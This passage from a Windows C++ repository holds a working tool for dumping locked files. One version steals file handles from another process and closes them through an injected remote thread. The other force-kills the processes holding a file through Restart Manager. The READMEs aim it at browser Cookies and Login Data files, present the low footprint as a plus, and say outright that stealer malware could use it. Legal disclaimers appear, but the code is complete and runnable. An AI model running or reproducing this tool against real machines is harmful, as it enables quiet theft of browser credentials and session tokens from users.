    bool CloseRemoteHandle(DWORD owner, HANDLE handle) {
        CLIENT_ID cid{};
        cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(owner));

        OBJECT_ATTRIBUTES oa{};
        oa.Length = sizeof(OBJECT_ATTRIBUTES);

        HANDLE hproc = nullptr;
        ULONG access = PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD;

        if (nt::OpenProcess(&hproc, access, &oa, &cid) != 0) {
            return false;
        }

        PVOID addr = reinterpret_cast<PVOID>(nt::Close);
        HANDLE hthread = nullptr;

        NTSTATUS status = nt::CreateUserThread(hproc, nullptr, FALSE, 0, 0, 0, addr, handle, &hthread, nullptr);

        if (hthread) {
            nt::Close(hthread);
        }
        nt::Close(hproc);

        return status == 0;
    }

}

int wmain(int argc, wchar_t** argv) {

    if (argc < 4) {
        wprintf(L"usage: flock.exe <process.exe> <filename> <output>\n");
        return 0;
    }

    const wchar_t* targetProcess = argv[1];
    const wchar_t* targetFile = argv[2];
    const wchar_t* outputPath = argv[3];

    auto processes = IDontLikeFileLocks::ScanProcesses(targetProcess);

    if (processes.empty()) {
        wprintf(L"[!] no matching process found\n");
        return 0;
    }

    for (auto& it : processes) {
        DWORD pid = it.first;
        auto& handles = it.second;

        wprintf(L"[+] pid %lu (%zu handles)\n", pid, handles.size());

        for (auto& h : handles) {
            IDontLikeFileLocks::CloseRemoteHandle(pid, h.Handle);

            auto res = IDontLikeFileLocks::ExtractFileFromHandle(
                h.Handle,
                pid,
                targetFile
            );

            if (!res.success) {
                continue;
            }

            wprintf(L"[+] extracted: %ls\n", res.path.c_str());

            if (!IDontLikeFileLocks::WriteFileToDisk(res.data, outputPath)) {
                wprintf(L"[!] failed to write output file\n");
                return 0;
            }

            wprintf(L"[+] saved to: %ls\n", outputPath);


            return 0;
        }
    }

    wprintf(L"[!] no matching file handle found\n");
    return 0;
}
```

`HandleDupliClosin/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{ac2f8d41-ecb4-49f8-9da4-eacefbd1e186}</ProjectGuid>
    <RootNamespace>IDontLikeFileLocks</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="IDontLikeFileLocks.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`HandleDupliClosin/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="IDontLikeFileLocks.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`HandleDupliClosin/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`HandleDupliClosin/Readme.md`:

```md
# IDontLikeFileLocks-HandleDupliClosin

dump locked files by stealing file handles, reading them, and then deleting the lock at the source

## How It Works

instead of opening a locked file through the filesystem (which fails because sharing violations), we target the process that already has the file open.

windows represents open files as handles owned by processes. if a process has a handle to a file, the file is readable through that handle regardless of sharing flags.

we enumerate processes, find the target one, then query its handle table using NT APIs. each handle is duplicated into our own process with `NtDuplicateObject`.

once duplicated, we check:
- is this a file handle?
- does its backing filename match what we want?

if yes, we read the file directly from the duplicated handle. no filesystem open happens, so no lock checks are involved.

after extraction, we close the original handle **inside the target process** by creating a remote thread that calls `NtClose` on it. this removes the lock completely because the process no longer holds the handle.

## Why This Works ü§î

file locks exist only while handles exist.

duplicating a handle does not rerun access or sharing checks -> it just creates another reference to the same file object.

closing the remote handle simply releases that reference. once no process holds the handle anymore, the file is unlocked.

## Usage

IDontLikeFileLocks.exe chrome.exe Cookies Cookies.db

## Architecture

tested on x64 Windows 11 (25H2)

## Technical Details
- NT APIs only (ntdll)
- handle enumeration via `NtQuerySystemInformation`
- file extraction via duplicated handles
- remote handle closure via `RtlCreateUserThread`
- yes this can probs crash the process if u run it 2x 
- no i do not care, run it once and just do all ur operations in one go (wait... megamind)

## Legal

don‚Äôt use this on machines you don‚Äôt own or have permission to test on.  
prison is bad for your coding productivity ü§î‚ùó

credits - https://github.com/etwhook/FileLockerFinder, zeromemoryex.

```

`LICENSE`:

```
MIT License

Copyright (c) 2026 EvilBytecode

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# IDontLikeFileLocks
- dump locked files / read / close remote handles :)
- Theres few methods in the repo and have readme feel free to read findfileinsection which has info on about how ive done it :D

## What This Does
Browsers lock their databases (Cookies, Login Data, History). You can't copy them while the browser is running.
This tool steals the memory-mapped section handle from the target process and dumps the file. No file I/O, no lock checks.

## Disclaimer
This technique could be (and probably is/will be) used by stealer malware to silently extract browser credentials and session tokens without killing processes or triggering obvious file access patterns. The method is effective precisely because it's quiet and non-destructive. That said, I don't encourage anyone to use this for building malware or accessing systems you don't own. This is strictly for authorized security research, red team operations with proper contracts, and forensics work where you have explicit permission. Using this on machines you're not authorized to access is illegal in basically every country US CFAA(10yrs less or more) Get it in writing, keep it legal, or don't use it at all... Thanks for reading! :)

```

`Rstrtmgr/IDontLikeFileLocks.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.14.36203.30 d17.14
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "IDontLikeFileLocks", "IDontLikeFileLocks\IDontLikeFileLocks.vcxproj", "{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x64.ActiveCfg = Debug|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x64.Build.0 = Debug|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x86.ActiveCfg = Debug|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Debug|x86.Build.0 = Debug|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x64.ActiveCfg = Release|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x64.Build.0 = Release|x64
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x86.ActiveCfg = Release|Win32
		{AC2F8D41-ECB4-49F8-9DA4-EACEFBD1E186}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {2C74EC44-012E-4E23-99EE-34A6B0C3CCBC}
	EndGlobalSection
EndGlobal

```

`Rstrtmgr/IDontLikeFileLocks/IDontLikeFileLocks.cpp`:

```cpp
#include <windows.h>
#include <restartmanager.h>
#include <cstdio>

#pragma comment(lib, "Rstrtmgr.lib")

namespace IDontLikeFileLocks {

    static const DWORD error_success = 0;
    static const DWORD error_more_data = 234;

    DWORD unlockfile(const wchar_t* filepath) {
        DWORD sessionhandle = 0;
        wchar_t sessionkey[CCH_RM_SESSION_KEY + 1]{};

        DWORD ret = RmStartSession(&sessionhandle, 0, sessionkey);
        if (ret != error_success)
            return ret;

        __try {
            LPCWSTR resources[1] = { filepath };

            ret = RmRegisterResources(
                sessionhandle,
                1,
                resources,
                0,
                nullptr,
                0,
                nullptr
            );

            if (ret != error_success)
                return ret;

            UINT needed = 0, count = 0;
            DWORD reboot = 0;

            ret = RmGetList(
                sessionhandle,
                &needed,
                &count,
                nullptr,
                &reboot
            );

            if (ret != error_success && ret != error_more_data)
                return ret;

            if (needed > 0)
                ret = RmShutdown(sessionhandle, RmForceShutdown, nullptr);
        }
        __finally {
            RmEndSession(sessionhandle);
        }

        return ret;
    }

    bool readanddump(const wchar_t* filepath, DWORD* outbytes) {

        CreateDirectoryW(L"dump", nullptr);

        HANDLE hfile = CreateFileW(
            filepath,
            GENERIC_READ,
            FILE_SHARE_READ,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hfile == INVALID_HANDLE_VALUE)
            return false;

        DWORD filesize = GetFileSize(hfile, nullptr);
        if (filesize == INVALID_FILE_SIZE) {
            CloseHandle(hfile);
            return false;
        }

        BYTE* buffer = new BYTE[filesize];
        DWORD bytesread = 0;

        if (!ReadFile(hfile, buffer, filesize, &bytesread, nullptr)) {
            delete[] buffer;
            CloseHandle(hfile);
            return false;
        }

        CloseHandle(hfile);

        const wchar_t* name = wcsrchr(filepath, L'\\');
        name = name ? name + 1 : filepath;

        wchar_t outpath[MAX_PATH]{};
        swprintf_s(outpath, L"dump\\%ls", name);

        HANDLE hout = CreateFileW(
            outpath,
            GENERIC_WRITE,
            0,
            nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hout == INVALID_HANDLE_VALUE) {
            delete[] buffer;
            return false;
        }

        DWORD written = 0;
        WriteFile(hout, buffer, bytesread, &written, nullptr);
        CloseHandle(hout);

        delete[] buffer;

        *outbytes = bytesread;
        wprintf(L"[+] dumped %lu bytes -> %ls\n", bytesread, outpath);
        return true;
    }

    bool fetchfile(const wchar_t* filepath, DWORD* outbytes) {
        for (int i = 0; i < 5; i++) {
            if (unlockfile(filepath) == error_success) {
                if (readanddump(filepath, outbytes))
                    return true;
            }
        }
        return false;
    }

}

int wmain(int argc, wchar_t** argv) {

    if (argc < 2) {
        printf("usage: IDontLikeFileLocks.exe <file>\n");
        return 0;
    }

    DWORD bytes = 0;

    if (!IDontLikeFileLocks::fetchfile(argv[1], &bytes)) {
        printf("[!] failed to dump file\n");
        return 0;
    }

    printf("[+] success\n");
    return 0;
}

```

`Rstrtmgr/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{ac2f8d41-ecb4-49f8-9da4-eacefbd1e186}</ProjectGuid>
    <RootNamespace>IDontLikeFileLocks</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="IDontLikeFileLocks.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Rstrtmgr/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="IDontLikeFileLocks.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`Rstrtmgr/IDontLikeFileLocks/IDontLikeFileLocks.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`Rstrtmgr/Readme.md`:

```md
# IDontLikeFileLocks-Rstmgr

dump locked files by politely asking windows to let go of them using the official Restart Manager API.

## How It Works

normally if a file is in use, you can‚Äôt touch it. Windows has a thing called the Restart Manager (`Rstrtmgr.dll`) that apps use to safely shutdown and restart other apps while updating stuff. we abuse it just a little:

* `RmStartSession` opens a session with the OS
* `RmRegisterResources` tells it which file we want
* `RmGetList` checks if any processes are locking it
* `RmShutdown` politely tells the OS: "yo can you release this file for a hot sec? (doesnt really release but kills the process -> read WhyThisWorks so u understand why this is way better than just spamming taskkil /f /im browsername.exe and hoping itll work)"
* `RmEndSession` closes everything back up

once the file is released, we read it and dump it into a `dump` folder. it‚Äôs basically Windows saying: "ok fine, you can have it now."

## Why This Works

because Windows has to let processes release files for updates, the Restart Manager API is allowed to temporarily unlock files
, sadly this kills the process so u can also do TASKILL /F /IM procname.exe, but this is way better cuz we dont guess the name so less IOC
good thing is Less IoC and also that this can survive filename-spoofing e.g chrome.exe is renamed to Rand.exe. 
## Usage

```
IDontLikeFileLocks.exe "C:\\path\\to\\locked_file"
```

it will dump the file into `dump\` in the current directory.

## Output
<img width="1114" height="338" alt="image" src="https://github.com/user-attachments/assets/e4ce8055-6dbd-40cd-b95d-0b2fadcb6968" />


## Notes

* retried 5 times if the file is stubborn
* works on normal user files (if you have permission)

## Legal

don't use this on computers you don't own or have permission to test on. messing with someone else's locked files is frowned upon and could get you into real trouble ü´∞

```